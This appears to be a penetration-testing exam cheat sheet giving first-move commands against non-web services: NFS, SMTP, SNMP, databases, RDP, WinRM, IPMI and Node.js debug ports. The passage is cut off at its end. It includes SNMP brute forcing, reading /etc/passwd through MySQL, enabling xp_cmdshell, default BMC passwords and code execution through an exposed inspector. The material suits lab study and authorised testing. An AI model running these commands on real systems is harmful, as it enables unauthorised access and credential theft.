> Purpose: the services that are not SMB/HTTP/SSH still decide machines. One page for the first move on each: NFS, SMTP, SNMP, MySQL, MSSQL, RDP, WinRM, IPMI — plus exposed debug ports, which are a service too. ## First move per service | Port | Service | First command | What pays | | --- | --- | --- | --- | | 2049 | NFS | showmount -e | exported shares, no_root_squash | | 25 | SMTP | nc -nv … 25 | usernames via VRFY/RCPT | | 161/udp | SNMP | snmpwalk -v2c -c public | users, processes, interfaces, community strings | | 3306 | MySQL | mysql -h … -u … -p | databases, file read, auth bypass | | 1433 | MSSQL | impacket-mssqlclient -windows-auth | xp_cmdshell, linked servers | | 3389 | RDP | xfreerdp | desktop as a valid user | | 5985 | WinRM | evil-winrm | PowerShell shell as an admin | | 623/udp | IPMI | nmap ipmi-version | version → default creds | | 9229 | Node inspector | node inspect | remote code execution | ## A. NFS ### Step 01 — List exports Priority: Core · Run on: Kali · Status: Syntax Checked ```bash showmount -e ``` Look for: /export * or a list of shares with allowed clients.
Decision: a share is exported to * or your subnet → Step 02. No output but 2049 is open → rpcinfo -p .
Next: Step 02.
Common mistake: skipping NFS because SMB was enumerated. Exports are often the shortest path to root.
Evidence: the showmount output. ### Step 02 — Mount the export Priority: Core · Run on: Kali · Status: Syntax Checked ```bash sudo mkdir -p /mnt/nfs && sudo mount -t nfs :/ /mnt/nfs -o nolock ls -la /mnt/nfs # older servers sometimes need sudo mount -t nfs -o nolock,vers=3 :/ /mnt/nfs ``` Look for: the export's contents, especially /home backups or web roots.
Decision: no_root_squash in /etc/exports → the Linux PrivEsc SUID trick works. Writable share + cron → plant a payload.
Next: read credentials, or escalate via the Linux PrivEsc page.
Common mistake: mounting read-only and assuming the share is useless for privesc. Check mount | grep nfs for rw.
Evidence: mount output and the directory listing. ## B. SMTP ### Step 03 — Manual probe Priority: Core · Run on: Kali · Status: Syntax Checked ```bash nc -nv 25 # then, at the banner: VRFY EXPN MAIL FROM: @ RCPT TO: @ ``` Look for: 250 (exists) vs 550 (does not). 252 means the server will not confirm.
Decision: VRFY answers → Step 04 to enumerate. VRFY disabled → try RCPT with a known domain.
Next: Step 04.
Common mistake: typing commands before reading the banner. Some servers require EHLO first.
Evidence: the responses for a known-good and a known-bad user. ### Step 04 — Enumerate users Priority: Core · Run on: Kali · Status: Syntax Checked ```bash smtp-user-enum -M VRFY -U -t smtp-user-enum -M RCPT -U -D -t ``` Look for: exists.
Decision: hits → valid usernames for spraying (Passwords & Hashes). No hits → the server blocks enumeration; move on.
Next: validate with a login attempt or spray.
Common mistake: using a generic wordlist that does not match the naming scheme. Derive names from the website and AD enumeration first.
Evidence: the exists lines. ## C. SNMP ### Step 05 — Walk with a community string Priority: Core · Run on: Kali · Status: Syntax Checked ```bash snmpwalk -v2c -c public snmpwalk -v2c -c private ``` Look for: sysDescr, sysName, running processes, installed software, user names, and sometimes credentials in descriptions.
Decision: data returns → Step 06 for targeted OIDs. Timeout → wrong community or ACL; try onesixtyone.
Next: Step 06.
Common mistake: giving up after public. Common strings are private, internal, cisco, manager — brute force them.
Evidence: the sysDescr/sysName values. ### Step 06 — Targeted values and community brute force Priority: Conditional · Run on: Kali · Status: Syntax Checked ```bash snmpwalk -v2c -c public 1.3.6.1.2.1.1.5.0 snmpwalk -v2c -c public 1.3.6.1.2.1.25.4.2.1.2 onesixtyone -c ``` Look for: the hostname, process list, and any community string that answers.
Decision: a valid community → full walk (Step 05). Nothing → SNMP is locked down; move on.
Next: use discovered names for spraying or note them as evidence.
Common mistake: assuming a failed walk means SNMP is closed. UDP 161 is often filtered from Kali but open from the pivot.
Evidence: the OID values and the working community string. ## D. Databases ### Step 07 — MySQL Priority: Core · Run on: Kali · Status: Syntax Checked ```bash mysql -h -u -p ``` ```sql # once in the MySQL prompt SELECT user,host FROM mysql.user; SHOW DATABASES; SELECT LOAD_FILE('/etc/passwd'); ``` Look for: passwordless root@%, application databases with credentials, FILE privilege.
Decision: LOAD_FILE works → read files as the DB user. FILE denied → look for credentials in the app's config instead.
Next: reuse database credentials on SSH/other services.
Common mistake: forgetting -h. Without it mysql tries the local socket and fails confusingly.
Evidence: the login, SHOW DATABASES, and the file read. ### Step 08 — MSSQL Priority: Core · Run on: Kali · Status: Syntax Checked ```bash impacket-mssqlclient /:@ -windows-auth ``` ```text # once in the mssqlclient prompt SELECT @@version; enable_xp_cmdshell xp_cmdshell whoami ``` Look for: sysadmin role and a working xp_cmdshell.
Decision: xp_cmdshell disabled and you are sysadmin → enable_xp_cmdshell. Not sysadmin → check EXECUTE AS LOGIN impersonation.
Next: OS command execution as the SQL service account.
Common mistake: omitting -windows-auth against a domain-joined instance — it then tries SQL auth and fails.
Evidence: the version, the role, and the command output. ## E. Remote access ### Step 09 — RDP from Linux Priority: Core · Run on: Kali · Status: Syntax Checked ```bash xfreerdp /v: /u: /p: /cert:ignore +clipboard xfreerdp /v: /u: /p: /cert:ignore /dynamic-resolution /drive:share,/tmp ``` Look for: a desktop session as the user.
Decision: NLA error → try /sec:tls or /sec:rdp. Account restrictions → the user may need Remote Desktop Users membership.
Next: capture proof from the GUI (Exam Execution page).
Common mistake: connecting as a user who is not allowed RDP, then concluding the credential is bad. Test the credential over SMB/WinRM first.
Evidence: the session plus whoami in a terminal on the desktop. ### Step 10 — WinRM shell Priority: Core · Run on: Kali · Status: Syntax Checked ```bash evil-winrm -i -u -p evil-winrm -i -u -H ``` Look for: an *Evil-WinRM* prompt.
Decision: connection refused → 5985 closed; use RDP, SMB execution, or WMI.
Next: enumerate as that user, then escalate.
Common mistake: assuming any valid credential works over WinRM. The account needs Remote Management Users or Administrators.
Evidence: the prompt and whoami. ## F. IPMI ### Step 11 — Version probe Priority: Conditional · Run on: Kali · Status: Syntax Checked ```bash nmap -sU -p623 --script ipmi-version ``` Prerequisites: the probe itself only needs nmap; the credential test in the decision below needs ipmitool (sudo apt install ipmitool), which is not installed on the build host used for this audit.
Look for: IPMI version: 2.0 and the BMC banner.
Decision: IPMI 2.0 → test default credentials (ADMIN/ADMIN, root/calvin) with ipmitool — ipmitool is not installed here, so install it or use the pivot's tooling.
Next: authenticated IPMI → possible BMC-level access.
Common mistake: scanning UDP through proxychains. SOCKS carries TCP only — run the UDP probe from the pivot.
Evidence: the nmap script output. ## G. Exposed debug ports ### Step 12 — Node.js inspector Priority: Conditional · Run on: target · Status: Documented ```bash # from a process list, spot an inspector port ps aux | grep -- --inspect # attach a debugger from the target node inspect 127.0.0.1:9229 ``` ```text # in the debugger REPL, execute in the target's context exec('process.getuid()') exec('require("child_process").execSync("id").toString()') ``` Look for: Debugger attached and the command output from the target process.
Decision: the inspector listens on 127.0.0.1 only → you need local access or a tunnel (Tunneling & Pivoting). Bound to 0.0.0.0 → reachable directly.
Next: use the code execution to read flags or escalate.
Common mistake: connecting to the HTTP port with a browser. The inspector protocol is WebSocket; use node inspect or the Chrome DevTools devtools:// endpoint.
Evidence: the command output and the process command line that exposed the port. ## H. Troubleshooting | Symptom | Cause | Fix | | --- | --- | --- | | showmount: RPC: Port mapper failure | 111/2049 filtered | Try from the pivot | | NFS mount hangs | Version mismatch | -o vers=3,nolock | | SMTP VRFY 252 | Server refuses to confirm | Use RCPT with a domain | | SNMP Timeout | Wrong community / ACL | onesixtyone, try from pivot | | MySQL Access denied | Wrong host grant | Try root@localhost from the target | | MSSQL TLS error | Old encryption | Add -ssl/-port 1433 variants; check the instance port | | RDP credSSP error | NLA | /cert:ignore, or update FreeRDP | | WinRM 5985 refused | Service disabled | Use SMB/WMI instead | Pivoting variant. Most of these are TCP and work through proxychains: ```bash proxychains4 mysql -h -u -p proxychains4 xfreerdp /v: /u: /p: /cert:ignore proxychains4 evil-winrm -i -u -p ``` SNMP (161/udp) and IPMI (623/udp) are UDP and will not traverse a SOCKS proxy — run those from the pivot host itself. RDP over a proxy is slow; expect a laggy desktop. ## J.
